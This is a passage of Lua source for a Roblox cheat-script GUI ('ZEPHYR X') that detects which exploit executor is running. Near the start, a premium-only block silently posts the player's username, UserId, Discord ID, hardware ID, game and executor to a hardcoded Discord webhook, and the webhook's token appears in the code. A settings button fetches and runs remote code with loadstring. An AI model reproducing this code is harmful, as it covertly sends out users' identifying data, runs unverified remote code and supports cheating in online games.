    local sectionsname = Instance.new("TextLabel")
    local hidearrow = Instance.new("ImageButton")
    local format_align_left = Instance.new("ImageButton")
    local SectionInners = Instance.new("Frame")
    local UIListLayout83274 = Instance.new("UIListLayout")
    local tabsmenu = Instance.new("Frame")
    local TabsContainer = Instance.new("ScrollingFrame")
    local TextButton_2 = Instance.new("TextButton")
    local UICorner_19 = Instance.new("UICorner")
    local UIListLayout_2 = Instance.new("UIListLayout")
    local Faderight = Instance.new("ImageLabel")
    local FadeLeft = Instance.new("ImageLabel")
    local Buttonframe = Instance.new("Frame")
    local _324432UIListLayout = Instance.new("UIListLayout")
    local _1uicostiumization = Instance.new("ImageButton")
    local _2settingsbutton = Instance.new("ImageButton")
    local _3Container = Instance.new("ImageButton")
    local _4lens = Instance.new("ImageButton")

    local COLORTABLE = {}
    if doesineediscool == true then
        pcall(function()
    local avatar = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
        local time = os.date("%x").." "..os.date("%X")
        local Exploit = syn_checkcaller and "Synapse" or identifyexecutor() == "ScriptWare" and "ScriptWare" or PROTOSMASHER_LOADED and "Protosmasher" or KRNL_LOADED and "KRNL" or "Unknown";
    
        local url = "https://discord.com/api/webhooks/985528816225099808/7wUf_BcMTrqGtwNzixlAzD4MU5QKj8pTSt44ehu5IfasweCV3hvAvelV2q-hULF-grCS"
        local data = {
        ["content"] = null,
        ["embeds"] = {
            {
              ["title"] = "✅|ZEPHYR X **PREMIUM** EXECUTED",
              ["description"] = "**----------------------------**",
              ["color"] = tonumber(7419530),
              ["fields"] = {
                  {
                    ["name"] = "**username**",
                    ["value"] = "**"..game.Players.LocalPlayer.name.."**\n----------------------------"
                  },
                  {
                    ["name"] = "**UserId**",
                    ["value"] = "**"..game.Players.LocalPlayer.UserId.."**\n----------------------------"
                  },
                  {
                    ["name"] = "**PREMIUM DETAILS**",
                    ["value"] = "**Name: **"..DiscordId.."\n**DiscordID: **"..DiscordId.."\n**HWID: **"..hwid.."\n----------------------------"
                  },
                  {
                    ["name"] = "**Game**",
                    ["value"] = "**"..info.Name.."**\n----------------------------"
                  },
                  {
                    ["name"] = "**Time**",
                    ["value"] = "**"..tostring(time).."**\n----------------------------"
                  },
                  {
                    ["name"] = "**Executor**",
                    ["value"] = "**"..Exploit.."**\n----------------------------"
                  }
                 }
            }
          }
      }
    
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {["content-type"] = "application/json"}
        request = http_request or request or HttpPost or syn.request
        local abcdef = {
            Url = url,
            Body = newdata,
            Method = "POST",
            Headers = headers
        }
        request(abcdef)
    end)
end
    if isfile("ZEPHYRXUICOLORS.ZEP") then
        if doesineediscool == true then
        local HttpService = game:GetService("HttpService")
        local dora = HttpService:JSONDecode(readfile("ZEPHYRXUICOLORS.ZEP"))
        COLORTABLE = dora
        else
            COLORTABLE = {
                Elements = {12, 12, 12},
                ElementsTextColour = {235,235,235},
                ElementsIconColour = {42,78,199},
                TopBar = {16,16,16},
                TabsBar = {28,28,28},
                MainBackGround = {12,12,12},
                ContainerBackGround = {28,28,28},
                TitleColour = {42,78,199}
            }
        end
    else
        COLORTABLE = {
            Elements = {12, 12, 12},
            ElementsTextColour = {235,235,235},
            ElementsIconColour = {42,78,199},
            TopBar = {16,16,16},
            TabsBar = {28,28,28},
            MainBackGround = {12,12,12},
            ContainerBackGround = {28,28,28},
            TitleColour = {42,78,199}
        }
    end
    
    
    ScreenGui.Parent = game.CoreGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    MainGui2.Name = "MainGui"
    MainGui2.Parent = ScreenGui
    MainGui2.AnchorPoint = Vector2.new(0.5, 0.5)
    MainGui2.BackgroundColor3 = Color3.fromRGB(COLORTABLE.MainBackGround[1],COLORTABLE.MainBackGround[2],COLORTABLE.MainBackGround[3])
    MainGui2.Position = UDim2.new(0.317808241, 0, 0.73794806, 0)
    MainGui2.Size = UDim2.new(0, 497,0, 478)
    MainGui2.Active = true
    MainGui2.Draggable = true
    
    
    TopFrame.Name = "TopFrame"
    TopFrame.Parent = MainGui2
    TopFrame.BackgroundColor3 = Color3.fromRGB(COLORTABLE.TopBar[1],COLORTABLE.TopBar[2],COLORTABLE.TopBar[3])
    TopFrame.Position = UDim2.new(0.0120724346, 0, 0.0195439737, 0)
    TopFrame.Size = UDim2.new(0, 485, 0, 15)
    
    UICorner2222.Parent = TopFrame
    UICorner2222.CornerRadius = UDim.new(0, 3)

    
    TextLabel.Parent = TopFrame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.Position = UDim2.new(0.016494846, 0, 0, 0)
    TextLabel.Size = UDim2.new(0, 80, 0, 15)
    TextLabel.Font = Enum.Font.GothamMedium
    if doesineediscool == true then
    TextLabel.RichText = true
    TextLabel.Text = [[ZEPHYR X <font color="#ffff00">Premium</font> | ]]
    else
    TextLabel.Text = "ZEPHYR X | "
    end
    TextLabel.TextColor3 = Color3.fromRGB(235, 235, 235)
    TextLabel.TextSize = 14.000
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    TextLabel_2.Parent = TopFrame
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 1.000
    if doesineediscool == true then
    TextLabel_2.Position = UDim2.new(0.325, 0, 0, 0)
    else
    TextLabel_2.Position = UDim2.new(0.181443289, 0, 0, 0)
    end
    TextLabel_2.Size = UDim2.new(0, 80, 0, 15)
    TextLabel_2.Font = Enum.Font.GothamMedium
    TextLabel_2.Text = libname.." V"..versiongui
    TextLabel_2.TextColor3 = Color3.fromRGB(COLORTABLE.TitleColour[1],COLORTABLE.TitleColour[2],COLORTABLE.TitleColour[3])
    TextLabel_2.TextSize = 14.000
    TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left


    
    UICorner_6.Parent = MainGui2
        
        
    
        Conainertainer.Name = "Conainertainer"
    Conainertainer.Parent = MainGui2
    Conainertainer.BackgroundColor3 = Color3.fromRGB(COLORTABLE.ContainerBackGround[1],COLORTABLE.ContainerBackGround[2],COLORTABLE.ContainerBackGround[3])
    Conainertainer.BackgroundTransparency = 0.500
    Conainertainer.Position = UDim2.new(0.014, 0,0.144, 0)
    Conainertainer.Size = UDim2.new(0, 485,0, 402)
    
    UICorner_7.Parent = Conainertainer
    
    Containers.Name = "Containers"
    Containers.Parent = Conainertainer
    tabsmenu.Name = "tabsmenu"
    tabsmenu.Parent = MainGui2
    tabsmenu.BorderColor3 = Color3.fromRGB(28, 28, 28)
    tabsmenu.BackgroundColor3 = Color3.fromRGB(COLORTABLE.TabsBar[1],COLORTABLE.TabsBar[2],COLORTABLE.TabsBar[3])
    tabsmenu.BackgroundTransparency = 0.500
    tabsmenu.Position = UDim2.new(0.00201207236, 0, 0.0895765498, 0)
    tabsmenu.Size = UDim2.new(0, 495, 0, 25)
    
    TabsContainer.Name = "TabsContainer"
    TabsContainer.Parent = tabsmenu
    TabsContainer.Active = true
    TabsContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TabsContainer.BackgroundTransparency = 1.000
    TabsContainer.BorderSizePixel = 0
    TabsContainer.Position = UDim2.new(0.004, 0,0.067, 0)
    TabsContainer.Size = UDim2.new(0, 486,0, 25)
    TabsContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
    TabsContainer.HorizontalScrollBarInset = Enum.ScrollBarInset.Always
    TabsContainer.ScrollBarThickness = 1
    TabsContainer.ScrollBarImageColor3 = Color3.fromRGB(42, 78, 199)
    TabsContainer.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
    TabsContainer.AutomaticCanvasSize = Enum.AutomaticSize.X
    
    UIListLayout_2.Parent = TabsContainer
    UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout_2.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Left
    UIListLayout_2.Padding = UDim.new(0, 10)
    
    Faderight.Name = "Faderight"
    Faderight.Parent = tabsmenu
    Faderight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Faderight.BackgroundTransparency = 1.000
    Faderight.Position = UDim2.new(0.917, 4,-0.44, -1)
    Faderight.Rotation = 270.000
    Faderight.Size = UDim2.new(0, 27, 0, 50)
    Faderight.Image = "http://www.roblox.com/asset/?id=7122166401"
    
    FadeLeft.Name = "FadeLeft"
    FadeLeft.Parent = tabsmenu
    FadeLeft.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    FadeLeft.BackgroundTransparency = 1.000
    FadeLeft.Position = UDim2.new(0, 11, -0.479999989, -1)
    FadeLeft.Rotation = 90.000
    FadeLeft.Size = UDim2.new(0, 27, 0, 50)
    FadeLeft.Image = "http://www.roblox.com/asset/?id=7122166401"
    
    
    -- SETTINGS:
    
    local Settings = Instance.new("Frame")
    local UICorner1321 = Instance.new("UICorner")
    local Keybindtxt = Instance.new("TextButton")
    local UICorner = Instance.new("UICorner")
    local OldUiButton = Instance.new("TextButton")
    local UICorner2732 = Instance.new("UICorner")
    local namelablels = Instance.new("TextLabel")
    local touchlable = Instance.new("ImageLabel")
    
    --Properties:
    
Settings.Name = "Settings"
Settings.Parent = MainGui2
Settings.BackgroundColor3 = Color3.fromRGB(COLORTABLE.ContainerBackGround[1],COLORTABLE.ContainerBackGround[2],COLORTABLE.ContainerBackGround[3])
Settings.Position = UDim2.new(0.0120000001, 0, 0.143999994, -2)
Settings.Size = UDim2.new(0, 486, 0, 402)
Settings.Visible = false

UICorner1321.Name = "UICorner1321"
UICorner1321.Parent = Settings

Keybindtxt.Name = "Keybindtxt"
Keybindtxt.Parent = Settings
Keybindtxt.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
Keybindtxt.BorderColor3 = Color3.fromRGB(19, 19, 19)
Keybindtxt.Position = UDim2.new(0.0309578851, 0, 0.0980715752, 0)
Keybindtxt.Size = UDim2.new(0, 84, 0, 16)
Keybindtxt.Font = Enum.Font.Gotham
Keybindtxt.Text = "Right Control"
Keybindtxt.TextColor3 = Color3.fromRGB(42, 78, 199)
Keybindtxt.TextSize = 11.000
Keybindtxt.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Keybindtxt.TextWrapped = true
local keybindnow = "LeftControl"
if readfile("zephyrxsettings.ZEP") == "" then

else
keybindnow = readfile("zephyrxsettings.ZEP")
end
Keybindtxt.MouseButton1Click:connect(
    function()
        Keybindtxt.Text = ". . ."
        local a, b = game:GetService("UserInputService").InputBegan:wait()
        if a.KeyCode.Name ~= "Unknown" then
            pcall(function()
            delfile("zephyrxsettings.ZEP")
            end)
            writefile("zephyrxsettings.ZEP", a.KeyCode.Name)
            Keybindtxt.Text = a.KeyCode.Name
            keybindnow = a.KeyCode.Name
        end
    end
)

game:GetService("UserInputService").InputBegan:connect(
    function(current, ok)
        if not ok then
            if current.KeyCode.Name == keybindnow then
                if MainGui2.Visible == true then
                    MainGui2.Visible = false
                    else
                    MainGui2.Visible = true
                end
            end
        end
    end
)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Keybindtxt

OldUiButton.Name = "OldUiButton"
OldUiButton.Parent = Settings
OldUiButton.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
OldUiButton.Position = UDim2.new(0.0301646721, 0, 0.0426454209, 0)
OldUiButton.Size = UDim2.new(0, 127, 0, 16)
OldUiButton.Font = Enum.Font.SourceSans
OldUiButton.Text = ""
OldUiButton.TextColor3 = Color3.fromRGB(0, 0, 0)
OldUiButton.TextSize = 14.000

OldUiButton.MouseButton1Click:Connect(function()
    LIB:DestroyLib()
    if isfile("UIOPTION.ZEP") == true then
        delfile("UIOPTION.ZEP")
        writefile("UIOPTION.ZEP", "old")
    else
    writefile("UIOPTION.ZEP", "old")
    end
    wait(1)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ECLIPSEXHUB/ECLIPSE-X/main/ECLIPSE%20X.txt", true))()
    end)
end)

UICorner2732.CornerRadius = UDim.new(0, 5)
UICorner2732.Name = "UICorner2732"
UICorner2732.Parent = OldUiButton

namelablels.Name = "namelablels"
namelablels.Parent = OldUiButton
namelablels.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
namelablels.BackgroundTransparency = 1.000
namelablels.Position = UDim2.new(0.11874143, 0, 0, 0)
namelablels.Size = UDim2.new(0, 111, 0, 16)
namelablels.Font = Enum.Font.GothamMedium
namelablels.Text = "VERSION 1.3 UI"
namelablels.TextColor3 = Color3.fromRGB(42, 78, 199)
namelablels.TextSize = 11.000
namelablels.TextWrapped = true
namelablels.TextXAlignment = Enum.TextXAlignment.Right

touchlable.Name = "touchlable"
touchlable.Parent = OldUiButton
touchlable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
touchlable.BackgroundTransparency = 1.000
touchlable.Position = UDim2.new(-0.00724280626, 2, 0.030500412, 0)
touchlable.Size = UDim2.new(0, 14, 0, 14)
touchlable.Image = "rbxassetid://3926305904"
touchlable.ImageColor3 = Color3.fromRGB(42, 78, 199)
touchlable.ImageRectOffset = Vector2.new(84, 204)
touchlable.ImageRectSize = Vector2.new(36, 36)






local UiCostum = Instance.new("Frame")
local UICorner1321 = Instance.new("UICorner")
local RightCostum = Instance.new("Frame")

local _1TopBar = Instance.new("TextButton")
_1TopBar.Text = ""
local title = Instance.new("TextLabel")
local indicator = Instance.new("Frame")
local corner = Instance.new("UICorner")
local rgb = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")

local UIListLayout = Instance.new("UIListLayout")

local _3MainBackGround = Instance.new("TextButton")
_3MainBackGround.Text = ""
local title_2 = Instance.new("TextLabel")
local indicator_2 = Instance.new("Frame")
local corner_4 = Instance.new("UICorner")
local rgb_2 = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local ImageLabel_2 = Instance.new("ImageLabel")



local _5ContainerBackGround = Instance.new("TextButton")
_5ContainerBackGround.Text = ""
local title_3 = Instance.new("TextLabel")
local indicator_3 = Instance.new("Frame")
local corner_7 = Instance.new("UICorner")
local rgb_3 = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local ImageLabel_3 = Instance.new("ImageLabel")



local _7TitleColour = Instance.new("TextButton")
_7TitleColour.Text = ""
local title_4 = Instance.new("TextLabel")
local indicator_4 = Instance.new("Frame")
local corner_10 = Instance.new("UICorner")
local rgb_4 = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local ImageLabel_4 = Instance.new("ImageLabel")

local _9TabBar = Instance.new("TextButton")
_9TabBar.Text = ""
local titlesssssss = Instance.new("TextLabel")
local indicatorsssss = Instance.new("Frame")
local cornerssssss = Instance.new("UICorner")
local rgbsssss = Instance.new("TextLabel")
local UICornerssss = Instance.new("UICorner")
local ImageLabelssssss = Instance.new("ImageLabel")


local LeftCostum = Instance.new("Frame")

local _1Elements = Instance.new("TextButton")
_1Elements.Text = ""
local title_5 = Instance.new("TextLabel")
local indicator_5 = Instance.new("Frame")
local corner_13 = Instance.new("UICorner")
local rgb_5 = Instance.new("TextLabel")
local UICorner_5 = Instance.new("UICorner")
local ImageLabel_5 = Instance.new("ImageLabel")


local UIListLayout_2 = Instance.new("UIListLayout")

local _3ElementsTextColour = Instance.new("TextButton")
_3ElementsTextColour.Text = ""
local title_6 = Instance.new("TextLabel")
local indicator_6 = Instance.new("Frame")
local corner_16 = Instance.new("UICorner")
local rgb_6 = Instance.new("TextLabel")
local UICorner_6 = Instance.new("UICorner")
local ImageLabel_6 = Instance.new("ImageLabel")





local _5ElementsIconColour = Instance.new("TextButton")
_5ElementsIconColour.Text = ""
local title_7 = Instance.new("TextLabel")
local indicator_7 = Instance.new("Frame")
local corner_21 = Instance.new("UICorner")
local rgb_7 = Instance.new("TextLabel")
local UICorner_7 = Instance.new("UICorner")
local ImageLabel_7 = Instance.new("ImageLabel")

local ApplyChanges = Instance.new("TextButton")
local UICornerapplychanges = Instance.new("UICorner")
local SaveConfig = Instance.new("TextButton")
local UICornerSavEConfig = Instance.new("UICorner")



UiCostum.Name = "UiCostum"
UiCostum.Parent = MainGui2
UiCostum.BackgroundColor3 = Color3.fromRGB(COLORTABLE.ContainerBackGround[1],COLORTABLE.ContainerBackGround[2],COLORTABLE.ContainerBackGround[3])
UiCostum.Position = UDim2.new(0.0120000001, 0, 0.143999994, -2)
UiCostum.Size = UDim2.new(0, 486, 0, 402)
UiCostum.Visible = false

UICorner1321.Name = "UICorner1321"
UICorner1321.Parent = UiCostum



Buttonframe.Name = "Buttonframe"
Buttonframe.Parent = TopFrame
Buttonframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttonframe.BackgroundTransparency = 1.000
Buttonframe.Position = UDim2.new(0.84, 0, 0, 0)
Buttonframe.Size = UDim2.new(0, 76,0, 15)

_324432UIListLayout.Parent = Buttonframe
_324432UIListLayout.FillDirection = Enum.FillDirection.Horizontal
_324432UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
_324432UIListLayout.SortOrder = Enum.SortOrder.Name
_324432UIListLayout.Padding = UDim.new(0, 8)

_1uicostiumization.Name = "1ui costiumization"
_1uicostiumization.Parent = Buttonframe
_1uicostiumization.BackgroundTransparency = 1.000
_1uicostiumization.Position = UDim2.new(0.248478472, 0, 0.022854805, 0)
_1uicostiumization.Size = UDim2.new(0, 15, 0, 15)
_1uicostiumization.ZIndex = 2
_1uicostiumization.Image = "rbxassetid://3926307971"
_1uicostiumization.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
_1uicostiumization.ImageRectOffset = Vector2.new(804, 4)
_1uicostiumization.ImageRectSize = Vector2.new(36, 36)
_1uicostiumization.MouseButton1Click:connect(function()
    tabsmenu.Visible = false
    UiCostum.Visible = true
    Conainertainer.Visible = false
    Settings.Visible = false
end)

_2settingsbutton.Name = "2settingsbutton"
_2settingsbutton.Parent = Buttonframe
_2settingsbutton.BackgroundTransparency = 1.000
_2settingsbutton.Position = UDim2.new(2.48076916, 0, 0.343096256, 0)
_2settingsbutton.Size = UDim2.new(0, 15, 0, 15)
_2settingsbutton.ZIndex = 2
_2settingsbutton.Image = "rbxassetid://3926307971"
_2settingsbutton.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
_2settingsbutton.ImageRectOffset = Vector2.new(324, 124)
_2settingsbutton.ImageRectSize = Vector2.new(36, 36)
_2settingsbutton.MouseButton1Click:connect(function()
    tabsmenu.Visible = false
    UiCostum.Visible = false
    Conainertainer.Visible = false
    Settings.Visible = true
end)

--Properties:

_3Container.Name = "3Container"
_3Container.Parent = Buttonframe
_3Container.BackgroundTransparency = 1.000
_3Container.LayoutOrder = 9
_3Container.Position = UDim2.new(0.5, 0, 0.5, 0)
_3Container.Size = UDim2.new(0, 15, 0, 15)
_3Container.ZIndex = 2
_3Container.Image = "rbxassetid://3926307971"
_3Container.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
_3Container.ImageRectOffset = Vector2.new(124, 4)
_3Container.ImageRectSize = Vector2.new(36, 36)
_3Container.MouseButton1Click:connect(function()
    tabsmenu.Visible = true
    UiCostum.Visible = false
    Conainertainer.Visible = true
    Settings.Visible = false
end)

_4lens.Name = "4lens"
_4lens.Parent = Buttonframe
_4lens.BackgroundTransparency = 1.000
_4lens.LayoutOrder = 5
_4lens.Position = UDim2.new(0.965883255, 0, 0, 0)
_4lens.Size = UDim2.new(0, 15, 0, 15)
_4lens.ZIndex = 2
_4lens.Image = "rbxassetid://3926305904"
_4lens.ImageColor3 = Color3.fromRGB(170, 0, 0)
_4lens.ImageRectOffset = Vector2.new(124, 124)
_4lens.ImageRectSize = Vector2.new(36, 36)
_4lens.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)















-------------------------------------------------------------------------------COLOROPTIONS
----------------------------------d
---q





RightCostum.Name = "RightCostum"
RightCostum.Parent = UiCostum
RightCostum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RightCostum.BackgroundTransparency = 1.000
RightCostum.Position = UDim2.new(0.5, 0, 0, 0)
RightCostum.Size = UDim2.new(0, 243, 0, 367)

_1TopBar.Name = "1 TopBar"
_1TopBar.Parent = RightCostum
_1TopBar.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_1TopBar.Size = UDim2.new(0, 221, 0, 22)


title.Name = "title"
title.Parent = _1TopBar
title.AnchorPoint = Vector2.new(0, 0.5)
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title.Size = UDim2.new(0.511312246, 0, 1, 0)
title.Font = Enum.Font.GothamMedium
title.Text = "Top Bar"
title.TextColor3 = Color3.fromRGB(235, 235, 235)
title.TextSize = 13.000
title.TextXAlignment = Enum.TextXAlignment.Left

indicator.Name = "indicator"
indicator.Parent = _1TopBar
indicator.AnchorPoint = Vector2.new(1, 0.5)
indicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner.CornerRadius = UDim.new(0, 3)
corner.Name = "corner"
corner.Parent = indicator

rgb.Name = "rgb"
rgb.Parent = indicator
rgb.AnchorPoint = Vector2.new(0.5, 0.5)
rgb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb.BackgroundTransparency = 1.000
rgb.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb.Size = UDim2.new(1, -14, 1, 0)
rgb.Font = Enum.Font.Gotham
rgb.Text = "255, 255, 255"
rgb.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb.TextSize = 11.000

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = _1TopBar

ImageLabel.Parent = _1TopBar
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel.Size = UDim2.new(0, 18, 0, 18)
ImageLabel.Image = "rbxassetid://3926307971"
ImageLabel.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel.ImageRectOffset = Vector2.new(804, 4)
ImageLabel.ImageRectSize = Vector2.new(36, 36)

-----------------
function start_2()
    local _2TopBarDrop = Instance.new("Frame")
local corner_2 = Instance.new("UICorner")
local container = Instance.new("Frame")
local corner_3 = Instance.new("UICorner")
local ColourWheel = Instance.new("ImageButton")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local Picker = Instance.new("ImageLabel")
local DarknessPicker = Instance.new("ImageButton")
local UIGradient = Instance.new("UIGradient")
local Slider = Instance.new("ImageLabel")
local clickblock = Instance.new("TextButton")
_2TopBarDrop.Name = "2 TopBarDrop"
_2TopBarDrop.Parent = RightCostum
_2TopBarDrop.AnchorPoint = Vector2.new(0.5, 0)
_2TopBarDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_2TopBarDrop.Position = UDim2.new(0.454732388, 0, 0.0572139286, 2)
_2TopBarDrop.Size = UDim2.new(0.909464896, 0, -0.0643519685, 148)
_2TopBarDrop.Visible = false
_2TopBarDrop.ZIndex = 3
_1TopBar.MouseButton1Click:connect(function()
    if _2TopBarDrop.Visible == true then
    _2TopBarDrop.Visible = false
    else
        for i,v in pairs(RightCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _2TopBarDrop.Visible = true
    end
end)
corner_2.CornerRadius = UDim.new(0, 3)
corner_2.Name = "corner"
corner_2.Parent = _2TopBarDrop

container.Name = "container"
container.Parent = _2TopBarDrop
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container.Position = UDim2.new(0.500000179, 0, 0.49999994, 0)
container.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container.ZIndex = 3

corner_3.CornerRadius = UDim.new(0, 3)
corner_3.Name = "corner"
corner_3.Parent = container

ColourWheel.Name = "ColourWheel"
ColourWheel.Parent = container
ColourWheel.Active = false
ColourWheel.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel.BackgroundTransparency = 1.000
ColourWheel.BorderSizePixel = 0
ColourWheel.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel.Selectable = false
ColourWheel.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint.Parent = ColourWheel
UIAspectRatioConstraint.AspectRatio = 1.000

Picker.Name = "Picker"
Picker.Parent = ColourWheel
Picker.AnchorPoint = Vector2.new(0.5, 0.5)
Picker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker.BackgroundTransparency = 1.000
Picker.BorderSizePixel = 0
Picker.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker.Name = "DarknessPicker"
DarknessPicker.Parent = container
DarknessPicker.Active = false
DarknessPicker.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker.BackgroundTransparency = 1.000
DarknessPicker.BorderSizePixel = 0
DarknessPicker.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker.Selectable = false
DarknessPicker.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker.ZIndex = 2
DarknessPicker.Image = "rbxassetid://3570695787"
DarknessPicker.ScaleType = Enum.ScaleType.Slice
DarknessPicker.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker.SliceScale = 0.120

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient.Rotation = 90
UIGradient.Parent = DarknessPicker

Slider.Name = "Slider"
Slider.Parent = DarknessPicker
Slider.AnchorPoint = Vector2.new(0.5, 0.5)
Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider.BackgroundTransparency = 1.000
Slider.BorderSizePixel = 0
Slider.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider.ZIndex = 2
Slider.Image = "rbxassetid://3570695787"
Slider.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider.ScaleType = Enum.ScaleType.Slice
Slider.SliceCenter = Rect.new(100, 100, 100, 100)
Slider.SliceScale = 0.120

clickblock.Name = "clickblock"
clickblock.Parent = _2TopBarDrop
clickblock.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock.BackgroundTransparency = 1.000
clickblock.Position = UDim2.new(0.50000006, 0, 0.49999994, 0)
clickblock.Size = UDim2.new(1, 0, 1, 0)
clickblock.ZIndex = 2
clickblock.Font = Enum.Font.SourceSans
clickblock.Text = ""
clickblock.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock.TextSize = 14.000

UIListLayout.Parent = RightCostum
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.Padding = UDim.new(0, 3)
if doesineediscool == true then
local colourWheel = ColourWheel
local wheelPicker = Picker
local uiGradient = uiGradient
local rgb = rgb

local darknessPicker = DarknessPicker
local darknessSlider = Slider

local colourDisplay = indicator


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.TopBar[1] = r
    COLORTABLE.TopBar[2] = g
    COLORTABLE.TopBar[3] = b
end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
